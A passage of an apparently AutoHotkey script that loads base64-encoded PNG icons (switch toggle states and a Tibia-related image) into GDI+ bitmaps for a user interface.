xePy5PS4E2EITlzCwcg1/CdnomaXL03YLl3E3INr4MXXYGlpHXqsiwyqrEFSW4KhqVdA7NycllHpyKgzPoDb0l2Zkw2h1Q//sSCgfuQ3F8JnnqvQVZ701k79gNdVYGopVhVFVGEImEExbzXjgUou1ATudOMcvpoTg4qjB/UhcVQS8tgP6DQ9BcBbQnp5Mm3dkbUPdeh+Snv4K0oABBzklvO4xwuCIhhUgs73w+L/Ly8lBYWMiq5b44ONrV91DFhJEuGXa/ATUdkDXHp6A5cTUp0p6ehYYk/8tRZFGr5CqSUqWrQTBYgWAoAdH6ZfQcg9FAB/xMtomDWN6Jg6N9jjObTTBSPpgi1VCOACXnb0FNgEkRAarPzKHkxDREK3tQTD/NKlxFsBwVFYtXOBwihflwZCKvMbjGODjWx1ks5hNmE02mLYHp7d9CcxeQUP4pvxhPilSnpqE8NQPpr/8Kdji3KwoppGrodB9AWVnZIhSgwlQD2saQlpYGjVbDWqFLrLuJg6MKw/Kuweawo1SWDwPdWHHiMnzXANG/RiA9fAklR66g+MjlxevoOHluCsXHJiFat40/6lV4OEQqK+H3+3nIryt2fzQapWOXi86US/lcs5WWgiKwh0IzHo7oeUCrxbLPwblhzUyBkcKzdfIeWqk5Ldo/BOHnQ8g9MALZwVHIDy1CbN3Ry6QrkPzjLJ7xh5FJJpR7PagkQJ/Px8vv/2o9mPfzpZ/jOP6wnJOTzXcG1BGcI+/xHI/BMWIaC+wO+23O4yJAIdRhAjw1ii10UzN14qYDA5B9PgDxvn7kkcT72OevK3Y/iV5Q3qExZP5xPwQOP1khgJVCKxKJUB5V8ABer/cxMagQlXx2H4Uevy4rOwsOeyl50MH6Ob1GreFZ4uBoV+fhSkpK2KTf6XLC5/fClZ8JhcEIz1u/wDpqWbZTHm6/eh+bhmexnprXxWrj4AyeG5pD9+E+eHo2QpSSAhkd/xyU8yyfGEQwGHwk9p3BUbEgT+XwYBJJAVwuBzi3i8E2FhcX8xxMcXBKpZIXg1MoFASoC1IbcSNQXoZygwrmXIKsrIb19TdR+4eP0HWwF929l9F9bhzdZ68sULSOxmepO/8mafnpS3C//UssDdVAkCvmiwM74bMWjGyhfJLze1iqUMhDiUQiqop6+H0euN2u+wTWwmxmts/riXDzgA9DVEtN7N98FOvBcj+CeiWcEjreULFRU9uiqm+GOtYGdVPrgqV6OGpaV0Db0g5zVzdMHatQ7OKQm5tDgEL+D6DU1BR+TM9Ih1QqIc+ZEKCI8tOm7bDb9hOYk+XYguBY3M7LYDSuowbwoI/eVEV5AJGABxGHFRGTFmGjmqRJSBGzDhGrARGbCWGvG6EKipYyP+8Zv4+j6uilXAwgSGJgLpfzuMlkflFDtrEtjImF5ILg2CK2Z7DPGo2Wej7DMovZ/GOHw/53t8t5nuPc4x6Pe8LDJUdeD/dAXs+E76G8Xo7NXSCgj2220jeMRlMTpQxvE9UP3r4nw0HwXyGK47mC+rL3AAAAAElFTkSuQmCC")
A_Args.PNG.SwitchType1Off  := Gdip_BitmapFromBase64(0,0,Data.PNG "DcAAAAcCAYAAADFsCezAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAACxIAAAsSAdLdfvwAAAdjSURBVFhHxVg5b1xVGJ0sXuJ1vMbjbezZx57tzb7vi5fY8UqHRImExB+goqOBkgpEy1IhOhARkSIhylAQBSEEEiDFUCEkGuDjnM8Z45c4IfYMoji6b968e98533a/+ywionA4HCa43W6Lx+OxeL1eRSgUsoTDYbvf73/Rbre/NTs7e2t6evoe8D3w3X+Bqakprn3fZrN9tri4+A54vAwOHnLx+XzKizyJR/lT01PFEYFAgMLKEPT+6OjoHxbLJcyy/C+4fPmygIMsLCx8FAwGNwCLy+U6vzhOgqheTHx7aGjI9AKrdVSuX5+W+blZmbXNyPT0lEyMj8vIyIi+fHJySuBZgcWBGZmZuRjac+FBXfvSpX8MS07g+W4wGBqjuOXlZRP/M8XxIafTaYFVHAiF++3FhoeHxOt1S7GQkxubG7K/vyuHh/tycLAnOze3pNmoSTqVFL/PK06nQ3x+vxhRQ+LxmEQxXhxRRSQSkZWVFXpN+vv7TkTOz8//iOgyyPm0wDPFEVhkcW5u7ldOprVcLoe0mg15DmIOIepgf08ODyCMAiGO2N/bAXZlfb0FIkFZXJgXhLISgqFkdTXQAVYFAgT5BmPFdbTZZk8Ewrt/4j2h0xpM4hiGvImFehbt9h84qa+vVwwjLLs7Oypmd2cbXluXzY012dxc0+uT38DN7RsqeG93R3LZNMQtqECSQ4iryG6AXkwkEogQp1y5ckUF0hl4j5Ua6MXHxLECoUJ+wLzq7emRqBGRPXhkd/emeoTYgIinYX2tKdsQuQ/v5rIZsS8uMDeUFC1Okd1CMpkU5JtcvXpVAVG34UEtMCZxvAHlsbGxMbWE2+2S7a1NzadWq3Ei7lmw1mqqR+nBaDQiC/PzyFefWpwCuwWuR4GoDVroyB0aWtwiTOJ4Awl5m26enJyUaqUsOwjDVqsua2uNc4PztrY2cN0SF8IHa6u1DcNQUt1CLMaCFZWJiQnp6+1jGnxF75nEQbGDJbe3t1eLwMYGiTWl0axfCE2OqKDb21uSTCRZ1XRdEqHAbiKVSqHouVBF+7EtTfM9aZM4eO6VkZFR3af48CbCql6vArUOUNUwrVRKsmRfEuSzimtbu1tgcWGY0nsMTaTYGyZxSPr3uDHOzNikVCyq12rVSsc4NlBVE5+hSUsn4gkIjHcNFEdwD6Rz8J5PTeKWlpbuUhwfKJdLannmXceAwGajLj6vV9emOIYp96tugcZKp9K6NVitVoGWbx8VdzQ8PKwESqWC1GoViCx2BexefOhc5mbnTnKkbe1ugBUznU5r2DM0oeVnkzi48sHoqFV7wmIhr1YvFQsdoww0EAXcWrg2841ESKhboLEymQy2G68WFGj5xSQOLr1H1VP4M5NJaxEooI/sFMViXirVsu5F6CI0JEmEhLoFGkvFwXM2NNrQ8p1JHFz6Ibt4JqQRCWtY5vPZjkFxHB9aVDIgks1mlUy3kMN66XRGnC6nNgwoXndM4nAIfXUJfeDg4KCSqNaqSiKb6wBovyoIb262NBqbXxLJ53KSy2S7hlKhKHFUzaUluzjA3ev1vGkW5/MbHpTriYlJELFKGqGZR+5xZJheBJzLaslwHMd5L40QKuThSYrrIkrFkgRweqBzGJrokddM4vhJAd77kk1uXx/aGORIFbmSSiUAJu05kUxo1Y0gxNn1sFrmc3kUq6KOFNkpuE6lXNaccyEkPR43hf30WOPMYwKqTWtlxY+qZtNGdHV1RcPquNw+OxKJOPIspx7qQ0vEQpXL0sJFKaB6FgqdIw+USyUYsIR2yw9hLvD1MySfdzgeOfJQnNPp4kH1Dh8aG7PqQTUUCmOvKoN00rS3PAncVPO0KsD8Zb/HCllG6JBMEQIpshPQ+9VKBahqM84vBMHgqqz4/fepg8c3kzje4B9ut2ciGAj8HgysaBHg8YefDUiW8U3y3KvOAsOD5NnnMRR7eCaMRaVSKiN80BRAnIrsAFyrUatjrbIK8/u9EokEtFi5XG5IOEPcseeOv0MgZhPhME+8Qf34Q4HsXrhJ0oMUebqc8zdHvowln8+zDWJLRAvXYGGOFFi9CDC/XqtJs97QtTIo+3CAhmEsyrNdkPm2Ru5tHSZxPJ4TfADtCwqMN4tJv8XjUfGguxgYuKak6ZGxsXH9ssUqyK6DR6WBgQE98vdfuyZuVKwSLFuv4thTa2CsgRROCRjPDcyrlCooIAU1loFthbXAiOAknohBWOgvFMMb5N4W9kRxbdC1CNFlWOhjCkwmoqhEbhxkxzWPGHLt431PT68MDQ3KIvpS7mksKHGEaYKNLcZOEENYs6kIIypCoSDuReA55Dc4IRQ/B8cQq+NpYf8qjhPaQHl9ARb6ggtyYV0cVuOL4jF0+ck47iUlC6RTcUUK92hZRfKCeDiX62UzaNuwPg0NoXe9Xt9Lrof8uI2dWxwn8fMDr7kQRNZgrdewd30SjRpfx2PRB4l47AgvPMK1IhYzjmJR4wj/69gNRI3INzDuLYTj6+CzjsKhnMiNHM8WJ5a/AZH6Gv8WHookAAAAAElFTkSuQmCC")
A_Args.PNG.SwitchType1HOn  := Gdip_BitmapFromBase64(0,0,Data.PNG "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")
A_Args.PNG.SwitchType1HOff := Gdip_BitmapFromBase64(0,0,Data.PNG "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")
A_Args.PNG.Tibia       := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
